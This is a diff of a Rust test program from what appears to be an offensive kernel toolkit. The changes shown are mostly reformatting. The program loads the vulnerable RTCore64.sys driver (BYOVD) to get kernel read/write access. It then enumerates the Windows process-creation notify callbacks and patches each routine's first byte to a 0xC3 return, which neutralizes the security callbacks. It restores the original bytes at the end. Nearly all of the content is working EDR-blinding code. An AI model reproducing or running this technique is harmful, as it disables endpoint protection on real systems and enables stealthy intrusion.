@@ -23,15 +23,39 @@ use nyx_operator_kernelsdk::win::{bootstrap_byovd, kernel_base};
 use nyx_operator_kernelsdk::{CallbackKit, KernelRw};
 
 const SYS_PATH: &[u16] = &[
-    'S' as u16, 'y' as u16, 's' as u16, 't' as u16, 'e' as u16, 'm' as u16,
-    '3' as u16, '2' as u16, '\\' as u16, 'd' as u16, 'r' as u16, 'i' as u16,
-    'v' as u16, 'e' as u16, 'r' as u16, 's' as u16, '\\' as u16,
-    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16,
-    '6' as u16, '4' as u16, '.' as u16, 's' as u16, 'y' as u16, 's' as u16, 0,
+    'S' as u16,
+    'y' as u16,
+    's' as u16,
+    't' as u16,
+    'e' as u16,
+    'm' as u16,
+    '3' as u16,
+    '2' as u16,
+    '\\' as u16,
+    'd' as u16,
+    'r' as u16,
+    'i' as u16,
+    'v' as u16,
+    'e' as u16,
+    'r' as u16,
+    's' as u16,
+    '\\' as u16,
+    'R' as u16,
+    'T' as u16,
+    'C' as u16,
+    'o' as u16,
+    'r' as u16,
+    'e' as u16,
+    '6' as u16,
+    '4' as u16,
+    '.' as u16,
+    's' as u16,
+    'y' as u16,
+    's' as u16,
+    0,
 ];
 const SVC_NAME: &[u16] = &[
-    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16,
-    '6' as u16, '4' as u16,
+    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
 ];
 
 const PSP_CREATE_PROCESS_NOTIFY_RVA: u32 = 0x4D9D70;
@@ -39,8 +63,12 @@ const PSP_CREATE_THREAD_NOTIFY_RVA: u32 = 0x4D9970;
 const PSP_LOAD_IMAGE_NOTIFY_RVA: u32 = 0x4D9B70;
 
 extern "system" {
-    fn RtlAdjustPrivilege(privilege: u32, enable: i32, current_thread: i32,
-                          enabled: *mut i32) -> i32;
+    fn RtlAdjustPrivilege(
+        privilege: u32,
+        enable: i32,
+        current_thread: i32,
+        enabled: *mut i32,
+    ) -> i32;
 }
 fn enable_privileges() {
     for luid in [10u32, 20u32] {
@@ -50,19 +78,28 @@ fn enable_privileges() {
 }
 
 /// 枚举一个 notify 数组：返回 (slot_index, ctx_kva, routine_kva, first_byte) 列表。
-fn enumerate_array(
-    krw: &dyn KernelRw,
-    array_kva: usize,
-) -> Vec<(usize, usize, usize, u8)> {
+fn enumerate_array(krw: &dyn KernelRw, array_kva: usize) -> Vec<(usize, usize, usize, u8)> {
     let mut out = Vec::new();
     for i in 0..notify_routines::ARRAY_LEN {
         let slot_kva = array_kva + i * 8;
-        let packed = match krw.kread_u64(slot_kva) { Ok(v) => v, Err(_) => continue };
-        if !notify_routines::is_occupied(packed) { continue; }
+        let packed = match krw.kread_u64(slot_kva) {
+            Ok(v) => v,
+            Err(_) => continue,
+        };
+        if !notify_routines::is_occupied(packed) {
+            continue;
+        }
         let ctx = notify_routines::unpack(packed) as usize;
-        if ctx == 0 { continue; }
-        let routine = match krw.kread_u64(ctx) { Ok(v) => (v & notify_routines::PTR_MASK) as usize, Err(_) => continue };
-        if routine == 0 { continue; }
+        if ctx == 0 {
+            continue;
+        }
+        let routine = match krw.kread_u64(ctx) {
+            Ok(v) => (v & notify_routines::PTR_MASK) as usize,
+            Err(_) => continue,
+        };
+        if routine == 0 {
+            continue;
+        }
         let first_byte = krw.kread_u64(routine).map(|v| v as u8).unwrap_or(0xFF);
         out.push((i, ctx, routine, first_byte));
     }
@@ -70,14 +107,20 @@ fn enumerate_array(
 }
 
 fn main() {
-    println!("[callback_neutralize_test] start pid={}", std::process::id());
+    println!(
+        "[callback_neutralize_test] start pid={}",
+        std::process::id()
+    );
     enable_privileges();
 
     println!("[K.1] bootstrap_byovd ...");
     let (mut loaded, krw) = unsafe {
         match bootstrap_byovd(SYS_PATH, SVC_NAME) {
             Ok(t) => t,
-            Err(e) => { eprintln!("[FAIL] bootstrap: {}", e); std::process::exit(1); }
+            Err(e) => {
+                eprintln!("[FAIL] bootstrap: {}", e);
+                std::process::exit(1);
+            }
         }
     };
     let base = unsafe { kernel_base::ntoskrnl_base() }.unwrap();
@@ -85,14 +128,20 @@ fn main() {
 
     // 只中和 CreateProcess 回调（任务 K 目标）。记录其它两个数组的 RVA 以供参考。
     let cp_array_kva = base + PSP_CREATE_PROCESS_NOTIFY_RVA as usize;
-    println!("[K.3] PspCreateProcessNotifyRoutine KVA = 0x{:016x}", cp_array_kva);
+    println!(
+        "[K.3] PspCreateProcessNotifyRoutine KVA = 0x{:016x}",
+        cp_array_kva
+    );
 
     // ---- 红线：neutralize 前枚举 + 记录每个 routine 首字节（供恢复）----
     println!("[K.4] enumerating CreateProcess callbacks (pre-neutralize) ...");
     let pre = enumerate_array(&krw, cp_array_kva);
     println!("       {} CreateProcess callback(s) registered:", pre.len());
     for (i, ctx, routine, fb) in &pre {
-        println!("         slot[{:2}] ctx=0x{:016x} routine=0x{:016x} first_byte=0x{:02x}", i, ctx, routine, fb);
+        println!(
+            "         slot[{:2}] ctx=0x{:016x} routine=0x{:016x} first_byte=0x{:02x}",
+            i, ctx, routine, fb
+        );
     }
     if pre.is_empty() {
         println!("[!] no CreateProcess callbacks — nothing to neutralize. Still verifying neutralize() is a no-op-safe.");
@@ -119,9 +168,16 @@ fn main() {
     // 记录 CreateProcess 的恢复信息用上面的 pre 列表。
     let count = match kit.neutralize(&krw) {
         Ok(n) => n,
-        Err(e) => { eprintln!("[FAIL] neutralize: {}", e); loaded.unload(); std::process::exit(2); }
+        Err(e) => {
+            eprintln!("[FAIL] neutralize: {}", e);
+            loaded.unload();
+            std::process::exit(2);
+        }
     };
-    println!("[OK] neutralize() overwrote {} routines total (CreateProcess+Thread+LoadImage)", count);
+    println!(
+        "[OK] neutralize() overwrote {} routines total (CreateProcess+Thread+LoadImage)",
+        count
+    );
 
     // ---- 验证：CreateProcess routine 首字节应 == 0xC3 ----
     println!("[K.6] verifying CreateProcess routines patched to 0xC3 (post-neutralize) ...");
@@ -129,32 +185,56 @@ fn main() {
     let mut all_c3 = true;
     for (i, _, routine, fb) in &post {
         let ok = *fb == 0xC3;
-        if !ok { all_c3 = false; }
-        println!("         slot[{:2}] routine=0x{:016x} first_byte=0x{:02x} {}", i, routine, fb, if ok {"✓"} else {"✗ NOT C3"});
+        if !ok {
+            all_c3 = false;
+        }
+        println!(
+            "         slot[{:2}] routine=0x{:016x} first_byte=0x{:02x} {}",
+            i,
+            routine,
+            fb,
+            if ok { "✓" } else { "✗ NOT C3" }
+        );
     }
     if all_c3 && !post.is_empty() {
-        println!("[OK] all {} CreateProcess routines patched to ret (0xC3) — callbacks fire but no-op", post.len());
+        println!(
+            "[OK] all {} CreateProcess routines patched to ret (0xC3) — callbacks fire but no-op",
+            post.len()
+        );
     }
 
     // ---- 功能验证：启一个进程，确认不 BSOD（回调被中和后应正常返回）----
-    println!("[K.7] spawning a throwaway process to confirm no BSOD under neutralized callbacks ...");
+    println!(
+        "[K.7] spawning a throwaway process to confirm no BSOD under neutralized callbacks ..."
+    );
     let _kid = std::process::Command::new("cmd.exe")
-        .args(["/c", "exit 0"]).status().map(|s| s.to_string()).unwrap_or_else(|e| e.to_string());
+        .args(["/c", "exit 0"])
+        .status()
+        .map(|s| s.to_string())
+        .unwrap_or_else(|e| e.to_string());
     println!("[OK] process spawn completed without bugcheck");
 
     // ---- 恢复：写回每个 routine 的原首字节（红线：必须恢复）----
     println!("[K.8] restoring original routine first-bytes ...");
     for (i, ctx, routine, orig_fb) in &pre {
         if let Err(e) = krw.kwrite(*routine, &[*orig_fb]) {
-            eprintln!("[FAIL] restore slot[{}] routine 0x{:016x}: {}", i, routine, e);
+            eprintln!(
+                "[FAIL] restore slot[{}] routine 0x{:016x}: {}",
+                i, routine, e
+            );
         }
     }
     // 验证恢复
     let restored = enumerate_array(&krw, cp_array_kva);
     let mut all_restored = true;
     for (i, _, _, fb) in &restored {
-        let orig = pre.iter().find(|(pi, _, _, _)| pi == i).map(|(_, _, _, ob)| *ob);
-        if orig != Some(*fb) { all_restored = false; }
+        let orig = pre
+            .iter()
+            .find(|(pi, _, _, _)| pi == i)
+            .map(|(_, _, _, ob)| *ob);
+        if orig != Some(*fb) {
+            all_restored = false;
+        }
     }
     if all_restored {
         println!("[OK] all CreateProcess routines restored to original first-bytes");
